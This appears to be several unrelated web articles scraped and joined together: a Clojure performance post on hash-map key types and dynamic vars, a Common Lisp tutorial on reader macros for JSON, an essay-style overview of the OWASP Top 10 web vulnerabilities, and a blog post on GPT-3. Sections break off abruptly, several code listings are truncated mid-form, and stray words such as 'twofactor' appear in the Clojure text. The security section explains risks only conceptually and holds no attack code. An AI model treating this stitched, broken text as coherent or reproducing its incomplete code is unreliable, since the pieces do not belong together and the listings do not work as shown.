<figure><table><tbody><tr><td>PersistentHashMap</td><td>[“a” “b”]</td><td>167 ns</td></tr><tr><td>“</td><td>(ArrayList. [“a” “b”])</td><td>95 ns</td></tr><tr><td>“</td><td>“a:b”</td><td>78 ns</td></tr><tr><td>“</td><td>(→CacheKey “a” “b”)</td><td>116 ns</td></tr><tr><td>HashMap</td><td>[“a” “b”]</td><td>36 ns</td></tr><tr><td>“</td><td>(ArrayList. [“a” “b”])</td><td>53 ns</td></tr><tr><td>“</td><td>“a:b”</td><td>33 ns</td></tr><tr><td>“</td><td>(→CacheKey “a” “b”)</td><td>152 ns</td></tr></tbody></table><figcaption>Benchmarks for (get map key) for different map and key types. CacheKey is a basic defrecord type; “a:b” is a simple String with the composite values concatenated, etc.</figcaption></figure>



<p>This is quite a lot of variation in performance: JDK’s HashMap performs significantly better (except when using a record key—we’ll look at that one later). What accounts for this? </p>



<p>Clojure defines <a href="https://clojure.org/guides/equality">equality</a> (i.e., clojure.core/=) more generically than Java’s .equals and this definition is used by Clojure’s data structures for equality comparison, PersistentHashMap in this case:</p>




<div><table><tbody><tr><td><p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br></p></td><td><p><span>(</span><span>let</span> <span>[</span>v <span>[</span><span>"a"</span> <span>"b"</span><span>]</span> v2 <span>[</span><span>"a"</span> <span>"b"</span><span>]</span><span>]</span><br>
&nbsp; &nbsp; <span>(</span>report<span>-</span>result<br>
&nbsp; &nbsp; &nbsp; <span>(</span>quick<span>-</span>benchmark<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>(</span><span>=</span> v v2<span>)</span> <span>{</span><span>}</span><span>)</span><span>)</span> <br>
<span>;; Execution time mean : 91.347726 ns</span><br>
&nbsp; &nbsp; <span>(</span>report<span>-</span>result<br>
&nbsp; &nbsp; &nbsp; <span>(</span>quick<span>-</span>benchmark<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>(</span><span>.</span>equals v v2<span>)</span> <span>{</span><span>}</span><span>)</span><span>)</span><span>)</span> <br>
<span>;; Execution time mean : 10.741904 ns</span></p></td></tr></tbody></table></div>




<p>Significant performance difference for these composite (vector) keys.</p>



<p>Of course, Clojure’s = is more general than Java .equals, which is a stricter comparison in several cases; here is just one example:</p>




<div><table><tbody><tr><td><p>1<br>2<br>3<br>4<br></p></td><td><p><span>(</span><span>.</span>equals <span>[</span><span>1</span> <span>2</span><span>]</span> <span>[</span><span>(</span>int <span>1</span><span>)</span> <span>2</span><span>]</span><span>)</span><br>
⇒ false<br>
<span>(</span><span>=</span> <span>[</span><span>1</span> <span>2</span><span>]</span> <span>[</span><span>(</span>int <span>1</span><span>)</span> <span>2</span><span>]</span><span>)</span><br>
⇒ true</p></td></tr></tbody></table></div>




<p>So we need to be sure that the keys we use in our map are carefully constructed to always compare correctly with the stronger .equals semantics.</p>



<p>Lastly, using a defrecord (CacheKey) appears to offer the worst performance. Let’s use some lightweight profiling to understand what is going on here, by comparing records vs vectors as keys:</p>




<div><table><tbody><tr><td><p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br></p></td><td><p><span>(</span><span>let</span> <span>[</span>k <span>(</span>→CacheKey <span>"a"</span> <span>"b"</span><span>)</span><br>

Map lookup using a vector tuple as the key.</figcaption></figure>



<p>From our profiling, the map equality used by the CacheKey record looks suspicious. We can confirm its performance is much worse than vector equals:</p>




<div><table><tbody><tr><td><p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br></p></td><td><p><span>(</span><span>let</span> <span>[</span>ka <span>(</span>→CacheKey <span>"a"</span> <span>"b"</span><span>)</span> kb <span>(</span>→CacheKey <span>"a"</span> <span>"b"</span><span>)</span><span>]</span><br>

<span>;; Execution time mean : 11.376671 ns</span></p></td></tr></tbody></table></div>




<p>The performance overhead we’ve discussed here is minimal for map lookups of singular values like keywords; we are generally okay to stick to Clojure datatypes for data entities where these key types are idiomatic. Still, using records (defrecord) for data entities can have a significant twofactor impact on key lookups:</p>




<div><table><tbody><tr><td><p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br></p></td><td><p><span>(</span><span>let</span> <span>[</span>k <span>(</span>→CacheKey <span>"a"</span> <span>"b"</span><span>)</span><span>]</span><br>
&nbsp; &nbsp; <span>(</span>quick<span>-</span>benchmark<br>
&nbsp; &nbsp; &nbsp; <span>(</span>:<span>a</span> k<span>)</span> <span>{</span><span>}</span><span>)</span><span>)</span><br>

&nbsp; <span>(</span><span>let</span> <span>[</span>k <span>{</span>:<span>a</span> <span>"a"</span> :<span>b</span> <span>"b"</span><span>}</span><span>]</span><br>
&nbsp; &nbsp; <span>(</span>quick<span>-</span>benchmark<br>
&nbsp; &nbsp; &nbsp; <span>(</span>:<span>a</span> k<span>)</span> <span>{</span><span>}</span><span>)</span><span>)</span><span>)</span><br>
<span>;; Execution time mean : 10.495481 ns</span></p></td></tr></tbody></table></div>




<p>To make a broader generalization to wrap up this section, the JDK ecosystem at large has battled-hardened collection and data structure offerings for high performance use cases and Clojure’s Java interop (with type hints!) gives us access to any of these that make sense for our code hot spots.</p>



<h2 id="dynamic-vars">Dynamic Vars vs. ThreadLocal</h2>



<p>Another occasional need is for a per-thread state mechanism. Clojure has dynamic vars and binding, but the Clojure implementation of reading a dynamic var is far less optimal than using a ThreadLocal directly:</p>




<div><table><tbody><tr><td><p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br></p></td><td><div><p><span>(</span><span>def</span> <span>^</span>:<span>dynamic</span> <span>*</span>dyna<span>-</span>state<span>*</span> nil<span>)</span><br>

<p>Reader macros are perhaps not as famous as ordinary macros. While macros are a great way to create your own DSL, reader macros provide even greater flexibility by allowing you to create entirely new syntax on top of Lisp.</p>

<p>Paul Graham explains them very well in <a href="http://www.paulgraham.com/onlisp.html">On Lisp</a> (Chapter 17, Read-Macros):</p>

<blockquote>
  <p>The three big moments in a Lisp expression’s life are read-time, compile-time, and runtime. Functions are in control at runtime. Macros give us a chance to perform transformations on programs at compile-time. …read-macros… do their work at read-time.</p>
</blockquote>

<blockquote>
  <p>Macros and read-macros see your program at different stages. Macros get hold of the program when it has already been parsed into Lisp objects by the reader, and read-macros operate on a program while it is still text. However, by invoking read on this text, a read-macro can, if it chooses, get parsed Lisp objects as well. Thus read-macros are at least as powerful as ordinary macros.</p>
</blockquote>

<p>(Note that read-macros and reader macros mean the same thing)</p>

<p>The Lisp reader is the thing that parses and translates raw text into an AST. In Lisp, the AST is better known as an s-expression (or sexp) – its either an <a href="http://www.lispworks.com/documentation/HyperSpec/Body/t_atom.htm">atom</a> or a <a href="http://www.lispworks.com/documentation/HyperSpec/Body/t_list.htm">list</a>.</p>

<p>Reader macros allow you to modify the behaviour of the Lisp reader.</p>

<h2 id="invoking-the-lisp-reader">Invoking the Lisp reader</h2>

<p>Not only can you modify the behaviour of the Lisp reader, you can also invoke it. The simplest way to invoke the Lisp reader is to call the function <a href="http://www.lispworks.com/documentation/HyperSpec/Body/f_rd_rd.htm"><code>READ</code></a>. When you call <code>READ</code> with no arguments, it reads text from the standard input and returns an s-expression as soon as it fully parses one.</p>

<div><div><pre><code>&gt; (read)
;; Provide this input: foo
FOO

&gt; (read)
;; Input: (foo 1 2 3)
(FOO 1 2 3)
</code></pre></div></div>

<p>The full syntax of <code>READ</code> looks like this:</p>

<div><div><pre><code><span>(</span><span>read</span> <span>&amp;optional</span> <span>input-stream</span> <span>eof-error-p</span> <span>eof-value</span> <span>recursive-p</span><span>)</span> <span>=&gt;</span> <span>object</span>
</code></pre></div></div>

<p>All the arguments to <code>READ</code> are optional. The first is the input stream; <code>eof-error-p</code> and <code>eof-value</code> specify end of file handling; <code>recursive-p</code> should be set to true whenever <code>READ</code> is called from inside another call to <code>READ</code>. When implementing reader macros, <code>recursive-p</code> should always be true.</p>

<h2 id="quote">Quote</h2>

<p>One of the simplest (and earliest) examples of a reader macro in Lisp is the single quote character <code>'</code>. This reader macro translates an expression of the form <code>'&lt;some-form&gt;</code> into <code>(quote &lt;some-form&gt;)</code>.</p>

<div><div><pre><code><span>'foo</span>       <span>;; translated to (quote foo)</span>
<span>'</span><span>(</span><span>1</span> <span>2</span> <span>3</span><span>)</span>   <span>;; translated to (quote (1 2 3))</span>
</code></pre></div></div>

<p>Simply put, the single quote character <code>'</code> is a little bit of syntactic sugar added on top of Lisp. Reader macros do just that – allow you to add syntactic sugar to Lisp. What makes them so powerful is that, just like ordinay macros, you write reader macros in Lisp itself. For example, <code>'</code> could be defined as:</p>

<div><div><pre><code><span>(</span><span>defun</span> <span>single-quote-reader</span> <span>(</span><span>stream</span> <span>char</span><span>)</span>
   <span>(</span><span>declare</span> <span>(</span><span>ignore</span> <span>char</span><span>))</span>
   <span>(</span><span>list</span> <span>(</span><span>quote</span> <span>quote</span><span>)</span> <span>(</span><span>read</span> <span>stream</span> <span>t</span> <span>nil</span> <span>t</span><span>)))</span>

<span>(</span><span>set-macro-character</span> <span>#\'</span> <span>#'</span><span>single-quote-reader</span><span>)</span>
</code></pre></div></div>

<p><a href="http://www.lispworks.com/documentation/HyperSpec/Body/f_set_ma.htm"><code>SET-MACRO-CHARACTER</code></a> makes the Lisp reader associate the single quote character <code>'</code> with the function <code>single-quote-reader</code>. Whenever the reader encounters <code>'</code>, it calls <code>single-quote-reader</code>. This function takes two arguments – the input stream and the character in the stream that triggered the call. <code>char</code> will always be <code>'</code> in this case.</p>

<p>Let’s trace step by step how this works. Assume we call <code>READ</code> on the following form:</p>



<p>When <code>READ</code> is invoked, this is how the input stream looks:</p>



<p>The current position of the stream is denoted by <code>^</code>. When <code>READ</code> is called, the next character in the stream is the quote. The reader reads this character, looks for its reader macro function, finds <code>single-quote-reader</code> and calls it. Just before <code>single-quote-reader</code> is called, this is how the stream looks:</p>



<p><code>single-quote-reader</code> calls <code>READ</code> again. The inner call to <code>READ</code> returns the symbol <code>foo</code>, so the return value of this function is the sexp <code>(quote foo)</code> (usually printed by the Lisp printer as <code>'foo</code>).</p>

<p>After <code>single-quote-reader</code> returns, the stream pointer moves beyond <code>foo</code>. [1]</p>



<h2 id="json">JSON</h2>

<p>Let’s work with a more complicated example. Let’s make the Lisp reader recognize <a href="https://json.org/">JSON</a> syntax.</p>

<div><div><pre><code>&gt; [1, 2, "foo"]
#(1 2 "foo")

&gt; { "foo": 1, "bar": 2 }
#&lt;HASH-TABLE :TEST EQUAL :COUNT 2 {1004EA5DD3}&gt;
</code></pre></div></div>

<p>We define a few constants to work with.</p>

<div><div><pre><code><span>(</span><span>defconstant</span> <span>+left-bracket+</span> <span>#\[</span><span>)</span>
<span>(</span><span>defconstant</span> <span>+right-bracket+</span> <span>#\]</span><span>)</span>
<span>(</span><span>defconstant</span> <span>+left-brace+</span> <span>#\{</span><span>)</span>
<span>(</span><span>defconstant</span> <span>+right-brace+</span> <span>#\}</span><span>)</span>
<span>(</span><span>defconstant</span> <span>+comma+</span> <span>#\,</span><span>)</span>
<span>(</span><span>defconstant</span> <span>+colon+</span> <span>#\:</span><span>)</span>
</code></pre></div></div>

<p>To read JSON arrays, we dispatch the left bracket to <code>read-left-bracket</code>.</p>

<div><div><pre><code><span>(</span><span>defun</span> <span>read-left-bracket</span> <span>(</span><span>stream</span> <span>char</span><span>)</span>
  <span>(</span><span>declare</span> <span>(</span><span>ignore</span> <span>char</span><span>))</span>
  <span>(</span><span>let</span> <span>((</span><span>*readtable*</span> <span>(</span><span>copy-readtable</span><span>)))</span>
    <span>(</span><span>set-macro-character</span> <span>+comma+</span> <span>'read-separator</span><span>)</span>
    <span>...</span>
    <span>))</span>

<span>(</span><span>set-macro-character</span> <span>+left-bracket+</span> <span>'read-left-bracket</span><span>)</span>
</code></pre></div></div>

<p>Note that I haven’t provided a complete definition for <code>read-left-bracket</code> yet. The <a href="http://www.lispworks.com/documentation/HyperSpec/Body/02_aa.htm">readtable</a> is an object that stores the association between characters and their reader macro functions, if any. <a href="http://www.lispworks.com/documentation/HyperSpec/Body/v_rdtabl.htm"><code>*READTABLE*</code></a> is a <a href="http://www.gigamonkeys.com/book/variables.html#dynamic-aka-special-variables">dynamic variable</a> that specifies the current readtable. <code>read-left-bracket</code> binds the current readtable to a copy of itself, and causes the comma character <code>,</code> to be associated with <code>read-separator</code> (which we will see shortly). The reason we copy and rebind the current readtable is to avoid clobbering the readtable entry for comma outside of the dynamic scope of <code>read-left-bracket</code>.</p>

<p>Here’s the complete definition for <code>read-left-bracket</code>:</p>

</code></pre></div></div>

<p>The bulk of the work of reading JSON objects is done by <code>read-next-object</code> – <code>read-left-bracket</code> calls this function repeatedly until it returns <code>NIL</code>. The list of objects is then transformed into <code>(vector obj1 obj2 ...)</code> which, at runtime, will return a Lisp vector.</p>

<p><code>read-next-object</code> takes three arguments: a delimiter, which indicates the end of a JSON array or object (i.e. right bracket or right brace); a separator, which separates objects inside a JSON array (comma) or object (comma or colon) and an optional stream argument that defaults to standard input. When <code>read-next-object</code> is first called inside an array the stream would be positioned just before the first object.</p>



<p><code>read-next-object</code> parses and returns the first object (the number <code>1</code> in this case), and positions the stream before the next object, discarding the separator. If there was any whitespace before the first object, it would be discarded.</p>



<p>This cycle repeats until <code>read-next-object</code> reads the last object in the array, <code>"foo"</code>. Since the next non-whitespace character after reading <code>"foo"</code> is not the separator but rather the delimiter, <code>read-next-object</code> returns <code>"foo"</code> but doesn’t try to read past the delimiter.</p>



<p>The last call to <code>read-next-object</code> notices that the next character is the delimiter. It moves the stream past the delimiter and returns <code>NIL</code>, which indicates to <code>read-left-bracket</code> that all the objects in the array have been read. Since the stream pointer is now positioned after the delimiter, the reader is now free to read a new object from the input stream.</p>



<p>This is how we define <code>read-separator</code>, the reader macro function for comma. This function signals an error whenever it is called – it is never meant to be called directly by the reader.</p>

<div><div><pre><code><span>(</span><span>defun</span> <span>read-separator</span> <span>(</span><span>stream</span> <span>char</span><span>)</span>
  <span>(</span><span>declare</span> <span>(</span><span>ignore</span> <span>stream</span><span>))</span>
  <span>(</span><span>error</span> <span>"Separator ~S shouldn't be read alone"</span> <span>char</span><span>))</span>
</code></pre></div></div>

<p>You might ask, if the separator is never meant to be read directly by the reader, why bother associating it with a macro function? The thing is, its not the macro function that’s important – what we really want to do is tell the Lisp reader that the separator is a <em>terminating</em> macro character. If this were not done, the Lisp reader could unwittingly treat the separator as part of the last object if there was no whitespace between the two. e.g. in <code>[foo, ...]</code>, the first object would be read as <code>foo,</code> instead of <code>foo</code> if comma was not a terminating macro character. [2]</p>

<p>Lastly, we also need to define a macro function for the right bracket. This needs to be done for the same reason we needed to define a macro function for the separator – so that we can tell the Lisp reader that it is a terminating macro character.</p>

<div><div><pre><code><span>(</span><span>defun</span> <span>read-delimiter</span> <span>(</span><span>stream</span> <span>char</span><span>)</span>
  <span>(</span><span>declare</span> <span>(</span><span>ignore</span> <span>stream</span><span>))</span>
  <span>(</span><span>error</span> <span>"Delimiter ~S shouldn't be read alone"</span> <span>char</span><span>))</span>

<span>(</span><span>set-macro-character</span> <span>+right-bracket+</span> <span>'read-delimiter</span><span>)</span>
</code></pre></div></div>

<p>Now we have everything in place to read a JSON array in Lisp. Time for some tests.</p>

<div><div><pre><code>&gt; []
#()

&gt; [1, 2, 3]
#(1 2 3)

&gt; [ "foo", "bar", "baz" ]
#("foo" "bar" "baz")

&gt; [1, 2, "foo"]
#(1 2 "foo")
</code></pre></div></div>

<p>Since we recursively call <code>READ</code> to read individual objects, nesting also works.</p>

<div><div><pre><code>&gt; [1, 2, [3, 4]]
#(1 2 #(3 4))
</code></pre></div></div>

<p>We can even use Lisp forms inside a JSON array, and they will work just fine.</p>

<div><div><pre><code>&gt; (let ((x 123) (y "foo")) [x, y])
#(123 "foo")
</code></pre></div></div>

<p>Remember that you can invoke the reader by calling <code>READ</code>, so you can always see the generated sexp for yourself.</p>

<div><div><pre><code>&gt; (read)
;; Input: [1, 2, "foo"]
(VECTOR 1 2 "foo")

&gt; (read)
;; Input: (let ((x 123) (y "foo")) [x, y])
(LET ((X 123) (Y "foo"))
  …</code></pre></div></div></article></div></div></div></div>

        <p>When developing a website, the web security part of the site is often forgotten or not the most crucial consideration. But in today’s society where everyone is on the internet surfing and sharing their personal information everywhere. Web security should be considered the number one priority.</p>
<p>To make a more secure web a list of the most common web vulnerbiliteis exsists. The Open Web Application Security Project helps you discover vulnerabilities and preventing them.</p>
<h2 id="what-is-the-open-web-application-security-project">What is The Open Web Application Security Project</h2>
<p>In September 2001, Mark Curphey started a non-profit organisation called The Open Web Application Security Project (OWASP), OWASP was a spin-off of the “webappsec” mailing list (Huseby, 2004). OWASP goal was to document and share knowledge and tools on web application security to help developers secure their web application against common security flaws. OWASP’s core values are to be open, innovative, global and have Integrity in the community (OWASP, n.d. B). All of the content from OWASP is freely and easily accessible from the OWASP website(OWASP, n.d. B).</p>
<p>OWASP provides many types of tools for testing the security of web applications, for example, OWASP Zed Attack Proxy (ZAP). ZAP is an open-source project that can help to find security vulnerabilities automatically. OWASP also provides lists of the top security vulnerabilities that exist on the web, the most known List from OWASP is the OWASP Top 10 Web Application Security Risks. They also provide a Top 10 API vulnerabilities list.</p>
<p>OWASP top 10 Web Application Security Risks is a list of the top 10 security concerns that is a common threat to web applications in the last few years (Cloudflare, n.d. A). This report is updated by a team of security expert from all over the world every few years (Cloudflare, n.d. A). OWASP claims on their site that implementing the OWASP top 10 is the most effective step toward changing the development culture in an organisation to produce more secure code (OWASP, n.d. A).</p>

<p>Stuttard (2011) claims in his book “The web application hacker’s handbook” that every web site he have tested between 2007 and 2011 was vulnerable to some of these. As high as 94% was susceptible to XSS, 78% had Sensitive Data Exposure, 62% had broken authentication, and 32% was vulnerable to SQL injection.</p>
<h3 id="1-injectionhttpsowasporgwww-project-top-tenowasp_top_ten_2017top_10-2017_a1-injectionhtml">1. <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection.html">Injection</a></h3>
<p>Injection vulnerability is the number one biggest problem on the web; injection is when untrusted data is sent via a form or other data submission, and then this data goes to a code interpreter. The most know injection form is SQL injection, SQL injection happens when someone sends specially crafted data to a format that expects a plaintext string to send through a SQL quarry to evaluate to return the desired data (OWASP, n.d. A).</p>
<p>To prevent Injection attacks, all input on a site must be validating the input and rejecting suspicious data and then sanitisation of the data by cleaning it for symbols that could potentially lead to injections (Cloudflare, n.d. A).</p>
<h3 id="2-broken-authenticationhttpsowasporgwww-project-top-tenowasp_top_ten_2017top_10-2017_a2-broken_authentication">2. <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication">Broken Authentication</a></h3>
<p>Login and authentication system that is implemented incorrectly could potentially have critical vulnerabilities that make it possible to gain access to someone else’s account and potentially compromise the whole system via an admin account (OWASP, n.d. A). Some example of broken authentication could be credential stuffing attack which means automatic injecting username/password pairs from earlier web site breaches (OWASP, n.d. C). The username/password pair list is then automatically entered into the site to check if one hacked account from another site is the same on other websites.</p>
<p>To reduce the attack factor for authentication vulnerabilities, a 2-factor authenticator should be implemented as it limits the ways that an attacker could access the system (Cloudflare, n.d. A). The authentication system should also be limited to how many times someone can try to login with the use of rate-limiting.</p>
<h3 id="3-sensitive-data-exposurehttpsowasporgwww-project-top-tenowasp_top_ten_2017top_10-2017_a3-sensitive_data_exposure">3. <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure">Sensitive Data Exposure</a></h3>
<p>A web application that exposes sensitive information either via not adequately protected API’s and websites. The data can be stolen either by just being exposed without proper authentication or via a man in the middle attack (MITM). MITM is when someone is listening in on the traffic that is exchanged via a client and a server (Cloudflare, n.d. B).</p>
<p>To minimise the data exposure, all data that contains sensitive information must be encrypted both when the data is in rest and when in transit, and the web application should only store essential sensitive data.</p>
<h3 id="4-xml-external-entities-xeehttpsowasporgwww-project-top-tenowasp_top_ten_2017top_10-2017_a4-xml_external_entities_xxe">4. <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE)">XML External Entities (XEE)</a></h3>
<p>Extensible Markup Language (XML) is a human and machine-readable markup language. The XML is processed by an XML parser if the parser is poorly configured, the input can reference external entities like a file URI and then sending the data to an attacker.</p>
<p>Due to the complexity and many security vulnerabilities that exist in XML parsers, XML should be phased out with a more straightforward data format or patch the XML parser and turn off the external entities.</p>
<h3 id="5-broken-access-controlhttpsowasporgwww-project-top-tenowasp_top_ten_2017top_10-2017_a5-broken_access_control">5. <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control">Broken Access Control</a></h3>
<p>An access control system should enforce what a user is allowed to do on a system, when this is not adequately enforced, or the system is broken, users can have access to data and functions that they should not be able to access (OWASP, n.d. A).</p>
<p>Broken Access Control can be secured by using Authorisation tokens on the web application (Cloudflare, n.d. A). Authorisation tokens is a token that is sent with each request to check that the request comes from the right person. The token should be checked for each request for what it is allowed to do.</p>

<p>Misconfiguration is when a system is not configured correctly, incomplete or by using default configuration that leads to displaying verbose error messages, that can contain sensitive data either about users or about the system which could lead to revealing vulnerabilities in the application (OWASP, n.d. A).</p>
<p>Misconfiguration can be mitigated by removing unused code from the code base and make the configuration less complicated and also check that the production code is not giving out debug messages and making error messages more general (Cloudflare, n.d. A).</p>

<p>Cross-site scripting (XSS) occurs when untrusted data is displayed on a webpage without the data being properly validated and sanitised (OWASP, n.d. A). XSS can occur when an input filed without proper validation and sanitising is saved and then return to the site again, like a comment on a forum. XSS can create HTML object on the site and even run untrusted JavaScript code in the client browser, which can lead to session hijacking, defacing the site or redirect the user to a malicious site which looks like the original site.</p>
<p>Like Injection, XSS vulnerabilities can be mitigated by validating and sanitise every input fields that users can write content (Cloudflare, n.d. A). Every HTTP request also needs to escape all data that is sent via URLs. Modern web development frameworks often provide build-in cross-site scripting protection (Cloudflare, n.d. A).</p>

<p>Serialisation is a concept of taking one object and turning it into a format that is more fitting to other tasks, like storing it on disk or in a database or for sending the data over a network (OWASP, n.d. A). Deserialisation is when a serialised object is converted back to its original form that can be easier for software to work with (OWASP, n.d. A). When deserialisation is not done correctly, it can lead to remote code execution, replay attacks, injection attacks and even privilege escalation attacks.</p>
<p>Deserialisation vulnerabilities are not easy to mitigate. However, there are some ways of preventing it from happening, like implementing strong type checking and monitoring the deserialisation process (Cloudflare, n.d. A). However, the only way to be sure that it is not exploited is to not deserialisation untrusted data streams.</p>

<p>Modern Web applications today are not coded 100% at the company, external components and libraries are often used to make the process faster to build as it helps the developer reduce to code needed to be written (Cloudflare, n.d. A). Some example libraries are the widely used front-end framework like Angular.js and Vue.js or backend frameworks like express.js. Thousands of websites are built on top of these frameworks, and often have multiple different types of libraries. If a vulnerability is found in a library that is popular potentially, several hundred thousand webpages are vulnerable to exploit (OWASP, n.d. A).</p>
<p>Update all library often with the latest security fixes and stay up-to-date on what libraries that have vulnerabilities in them (Cloudflare, n.d. A). Go over the web application often and reconsider every single library used and remove libraries that are not used or not actively maintained.</p>

<p>A data breach on average take up to 200 days from the attack happened to it get discovered (Cloudflare, n.d. A), which gives an attacker a lot of time to find the data they want and take over other systems on the network. When it is discovered the logs can be erased or not be complete enough even to investigate what happened.</p>
<p>Logs need to be stored multiple places, and on remote servers, the logging service needs to be an append-only database mode so no one can overwrite the logs that exist (Cloudflare, n.d. A),. There should be integrity control on every record that is written, so no log files can be tampered with. Every action taken on the site needs to be logged, access …</p></article></div></div></div></div>

<p>GPT-3 has become famous overnight through viral posts on social networks. Between hype and anxiety, what exactly is GPT-3? <strong>Why this AI surprised so many devs in particular?</strong> Is this game changer?</p>



<h3>For science</h3>



<p>Today, we will discuss artificial intelligence. And I know that this subject tends to piss off a lot of people very quickly. Especially developers. Y<strong>et, for now, AI is just a tool like any other.</strong></p>



<p>I’m not going to explain what AI is or how a model works. We will only talk about what unleashes passions, <strong>generator of hype or anxiety attack depending on the point of view</strong>, GPT-3!</p>



<figure><img src="https://i.imgur.com/kLrSCZK.jpg" data-src="https://i.imgur.com/kLrSCZK.jpg" alt=""></figure>



<p>The company behind this technology is <a href="https://openai.com/" target="_blank" rel="noreferrer noopener">OpenAI</a>. OpenAI is famous for three main reasons.</p>



<p><strong>The first is that one of the founders is <a href="https://en.wikipedia.org/wiki/Elon_Musk" target="_blank" rel="noreferrer noopener">Elon Musk</a>.</strong> <a href="https://www.theguardian.com/technology/2014/oct/27/elon-musk-artificial-intelligence-ai-biggest-existential-threat" target="_blank" rel="noreferrer noopener">The person who is the most afraid of artificial intelligence in the world</a>. The other founder is <a href="https://twitter.com/sama" target="_blank" rel="noreferrer noopener">Sam Altman</a> who we will talk about later.</p>



<p><strong>The second is the reason why this company exists.</strong> The goal of OpenAI is to develop artificial intelligence in a safe and sustainable way for human beings. Musk is convinced that uncontrolled AI will cause the end of humanity, so OpenIA promote a safe way to control it.</p>

</p></figure>



<p><strong>The third is that OpenAI is frequently in the news with these impressive repeated successes in its field.</strong> Notably the former <a href="https://openai.com/blog/language-unsupervised/" target="_blank" rel="noreferrer noopener">GPT</a> and <a href="https://openai.com/blog/better-language-models/" target="_blank" rel="noreferrer noopener">GPT2</a> models. The last one being our hot topic of the day.</p>



<h3>What’s GPT-3</h3>



<p><strong>Generative Pretrained Transformer 3 (GPT-3) is a <a href="https://en.wikipedia.org/wiki/Language_model" target="_blank" rel="noreferrer noopener">language model</a> that uses deep learning (neural network) to produce text. </strong>For the uninitiated, I’m embarking on a highly simplified explanation that will make specialists cry blood.</p>



<p>The principle of a language model is to look at one part of a sentence and predict the next word. <strong>GPT-3 is a technology that has been trained on a SCANDALOUS amount of text written by humans</strong>. Nearly a <strong><a href="https://venturebeat.com/2020/05/29/openai-debuts-gigantic-gpt-3-language-model-with-175-billion-parameters/" target="_blank" rel="noreferrer noopener">TRILLION</a></strong> words via <a href="https://commoncrawl.org/the-data/" target="_blank" rel="noreferrer noopener">common crawl</a>. Based on this small sample, it generates text (output) that makes the most sense for an input.</p>



<p>Concretely,<strong> by learning to predict which letters and words tend to follow each other when written by a human</strong>, GPT-3 is able to predict text that makes sense in a context. It’s the same concept as your cell phone predicting the next word when you write a message. Except that it’s infinitely bigger, more complicated and more advanced.</p>



<figure><img src="https://i.imgur.com/xwi5mbF.jpg" data-src="https://i.imgur.com/xwi5mbF.jpg" alt=""></figure>



<p>And so far, GPT-3 is not bringing much new. The architecture of this technology (<a href="https://towardsdatascience.com/https-medium-com-chaturangarajapakshe-text-classification-with-transformer-models-d370944b50ca" target="_blank" rel="noreferrer noopener">transformer-based</a>) is the same as the previous version (GPT-2). <strong>This architecture is almost <a href="https://en.wikipedia.org/wiki/Transformer_(machine_learning_model)" target="_blank" rel="noreferrer noopener">3 years old</a>.</strong> So what is so special about GPT-3?</p>



<h3>Huge</h3>



<p>GPT-3 is absolutely gigantic! GPT-2 was already huge with no less than 1.5 billion parameters. The previous record was held by <a href="https://www.microsoft.com/en-us/research/blog/turing-nlg-a-17-billion-parameter-language-model-by-microsoft/" target="_blank" rel="noreferrer noopener">Turing-NLG of microsoft</a> with these 17 billion parameters. <strong>GPT-3 explodes all records with an indecent 175 billion parameters!</strong> Never seen before.</p>



<figure></figure>



<p>And the aftermath of this is impressive results. GPT-3 is capable of far too much.</p>



<ul><li><strong><a href="https://www.gwern.net/GPT-3#william-shakespeare" target="_blank" rel="noreferrer noopener">write poems</a></strong> in the style of certain authors</li><li><strong><a href="https://twitter.com/OthersideAI/status/1285776335638614017" target="_blank" rel="noreferrer noopener">write your emails</a></strong> with your own style</li><li><strong><a href="https://maraoz.com/2020/07/18/openai-gpt3/" target="_blank" rel="noreferrer noopener">write blog posts about himself</a></strong></li><li>write <a href="https://www.theverge.com/2020/8/16/21371049/gpt3-hacker-news-ai-blog" target="_blank" rel="noreferrer noopener"><strong>number one blog posts on hacker news</strong></a></li><li>write<strong> <a href="https://jamesyu.org/singular/" target="_blank" rel="noreferrer noopener">whole fictions</a></strong>, <a href="https://www.gwern.net/GPT-3" target="_blank" rel="noreferrer noopener">many fictions</a></li><li>even <a href="https://play.aidungeon.io/main/landing" target="_blank" rel="noreferrer noopener"><strong>infinite interactive fiction games</strong></a></li><li>design <a href="https://twitter.com/jsngr/status/1284511080715362304" target="_blank" rel="noreferrer noopener"><strong>simple applications</strong></a></li><li>the list is endless and it’s getting longer every day… if you want to scare yourself, here’s <a href="https://gpt3examples.com/" target="_blank" rel="noreferrer noopener"><strong>a website that groups them together</strong></a>.<br></li></ul>



<div><p>And GPT-3 is capable of something else that immediately worried developers. <strong>GPT-3 is capable of producing code.</strong> Do you want a todo list application in ReactJS instantly? Just ask for it.</p></div>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>I built a todo list app simply by describing it to GPT-3.</p><p>It generated the React code for a fully functioning app within seconds.</p><p>I'm becoming more impressed and aware of its capabilities every single day. <a href="https://t.co/QGrClar03s">pic.twitter.com/QGrClar03s</a></p></div>— Sharif Shameem (@sharifshameem) <a href="https://twitter.com/sharifshameem/status/1284421499915403264?ref_src=twsrc%5Etfw">July 18, 2020</a></blockquote>

In short,  some easy developer tasks can now be automated by GPT-3.</p>



<p>Of course, with all this exploding at the same time on the Internet, many have asked themselves the question of <a href="https://towardsdatascience.com/will-gpt-3-kill-coding-630e4518c04d" target="_blank" rel="noreferrer noopener">the future of developers</a>. <strong>For some <a href="https://kitze.io/posts/gpt3-is-the-beginning-of-the-end" target="_blank" rel="noreferrer noopener">it’s the beginning of the end</a>.</strong></p>



